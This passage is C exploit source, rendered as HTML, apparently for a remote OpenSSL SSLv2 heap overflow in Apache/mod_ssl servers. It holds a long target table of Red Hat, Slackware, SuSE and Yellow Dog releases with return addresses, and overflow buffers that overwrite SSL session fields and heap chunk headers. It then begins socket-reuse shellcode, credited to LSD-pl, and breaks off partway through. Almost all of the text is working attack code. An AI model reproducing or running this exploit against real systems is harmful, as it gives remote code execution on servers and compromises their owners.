&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.x (apache-1.3.26-1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080873bc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; "RedHat Linux 7.x (apache-1.3.27)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08087221<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.0 (apache-1.3.12-25)1",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809251c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.0 (apache-1.3.12-25)2",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809252d<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.0 (apache-1.3.14-2)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08092b98<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08084358<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808438c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08086e41<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.1 (apache-1.3.19-5)1",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809af8c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.1 (apache-1.3.19-5)2",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809afd9<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808438c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.1-Update (1.3.22-5.7.1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08084389<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.1 (apache-1.3.22-src)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0816021c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.1-Update (1.3.27-1.7.1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08086ec89<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.2 (apache-1.3.20-16)1",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080994e5<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.2 (apache-1.3.20-16)2",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080994d4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.2-Update (apache-1.3.22-6)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08084045<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.2 (apache-1.3.24)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x80b0938<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.2 (apache-1.3.26)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08161c16<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.2 (apache-1.3.26-snc)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x8161c14<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Redhat Linux 7.2 (apache-1.3.26 w/PHP)1",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08269950<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Redhat Linux 7.2 (apache-1.3.26 w/PHP)2",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08269988<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08086af9<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.3 (apache-1.3.23-11)1",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808528c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.3 (apache-1.3.23-11)2",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808525f<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 7.3 (apache-1.3.27)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080862e4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; "RedHat Linux 8.0 (apache-1.3.27)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08084c1c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; "RedHat Linux 8.0-second (apache-1.3.27)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808151e<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; "RedHat Linux 8.0 (apache-2.0.40)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08092fa4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Slackware Linux 4.0 (apache-1.3.6)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08088130<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Slackware Linux 7.0 (apache-1.3.9)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080a7fc0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Slackware Linux 7.0 (apache-1.3.26)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x083d37fc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; "Slackware 7.0 &nbsp;(apache-1.3.26)2",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x083d2232<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Slackware Linux 7.1 (apache-1.3.12)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080a86a4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Slackware Linux 8.0 (apache-1.3.20)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080ae67c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Slackware Linux 8.1 (apache-1.3.24)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080b0c60<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Slackware Linux 8.1 (apache-1.3.26)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080b2100<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Slackware Linux 8.1-stable (apache-1.3.26)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080b0c60<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; "Slackware Linux (apache-1.3.27)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080b1a3a<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "SuSE Linux 7.0 (apache-1.3.12)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809f54c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "SuSE Linux 7.1 (apache-1.3.17)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08099984<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "SuSE Linux 7.2 (apache-1.3.19)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08099ec8<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "SuSE Linux 7.3 (apache-1.3.20)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08099da8<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "SuSE Linux 8.0 (apache-1.3.23)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08086168<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "SUSE Linux 8.0 (apache-1.3.23-120)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080861c8<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "SuSE Linux 8.0 (apache-1.3.23-137)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080861c8<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
/* this one unchecked cause require differend shellcode */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0xfd42630<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
<br/>
};<br/>
<br/>
extern int errno;<br/>
<br/>
int cipher;<br/>
int ciphers;<br/>
<br/>
/* the offset of the local port from be beginning of the overwrite next chunk buffer */<br/>
#define FINDSCKPORTOFS &nbsp; &nbsp; 208 + 12 + 46<br/>
<br/>
unsigned char overwrite_session_id_length[] =<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAA" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* int master key length; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &nbsp; &nbsp; &nbsp;/* unsigned char master key[SSL MAX MASTER KEY LENGTH]; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x70\x00\x00\x00"; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* unsigned int session id length; */<br/>
<br/>
unsigned char overwrite_next_chunk[] =<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAA" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* int master key length; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &nbsp; &nbsp; &nbsp;/* unsigned char master key[SSL MAX MASTER KEY LENGTH]; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAA" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* unsigned int session id length; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &nbsp; &nbsp; &nbsp;/* unsigned char session id[SSL MAX SSL SESSION ID LENGTH]; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAA" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* unsigned int sid ctx length; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &nbsp; &nbsp; &nbsp;/* unsigned char sid ctx[SSL MAX SID CTX LENGTH]; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAA" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* int not resumable; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x00\x00\x00\x00" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* struct sess cert st *sess cert; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x00\x00\x00\x00" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* X509 *peer; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAA" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* long verify result; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x01\x00\x00\x00" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* int references; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAA" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* int timeout; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAA" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* int time */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAA" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* int compress meth; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x00\x00\x00\x00" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* SSL CIPHER *cipher; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAA" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* unsigned long cipher id; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x00\x00\x00\x00" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* STACK OF(SSL CIPHER) *ciphers; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x00\x00\x00\x00\x00\x00\x00\x00" &nbsp; &nbsp; &nbsp;/* CRYPTO EX DATA ex data; */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "AAAAAAAA" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* struct ssl session st *prev,*next; */<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x00\x00\x00\x00" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* Size of previous chunk */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x11\x00\x00\x00" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* Size of chunk, in bytes */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "fdfd" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* Forward and back pointers */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "bkbk"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x10\x00\x00\x00" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* Size of previous chunk */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "\x10\x00\x00\x00" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* Size of chunk, PREV INUSE is set */<br/>
<br/>
/* shellcode start */<br/>
&nbsp; &nbsp; "\xeb\x0a\x90\x90" &nbsp;/* jump 10 bytes ahead, land at shellcode */<br/>
&nbsp; &nbsp; "\x90\x90\x90\x90"<br/>
&nbsp; &nbsp; "\x90\x90\x90\x90" &nbsp;/* this is overwritten with FD by the unlink macro */<br/>
<br/>
/* 72 bytes findsckcode by LSD-pl */<br/>
&nbsp; &nbsp; "\x31\xdb" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* xorl &nbsp; &nbsp;%ebx,%ebx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x89\xe7" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movl &nbsp; &nbsp;%esp,%edi &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x8d\x77\x10" &nbsp; &nbsp; &nbsp; &nbsp; /* leal &nbsp; &nbsp;0x10(%edi),%esi &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x89\x77\x04" &nbsp; &nbsp; &nbsp; &nbsp; /* movl &nbsp; &nbsp;%esi,0x4(%edi) &nbsp; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\x8d\x4f\x20" &nbsp; &nbsp; &nbsp; &nbsp; /* leal &nbsp; &nbsp;0x20(%edi),%ecx &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x89\x4f\x08" &nbsp; &nbsp; &nbsp; &nbsp; /* movl &nbsp; &nbsp;%ecx,0x8(%edi) &nbsp; &nbsp; &nbsp; &nbsp; */<br/>
&nbsp; &nbsp; "\xb3\x10" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movb &nbsp; &nbsp;$0x10,%bl &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
&nbsp; &nbsp; "\x89\x19" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* movl &nbsp; &nbsp;%ebx,(%ecx) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br/>
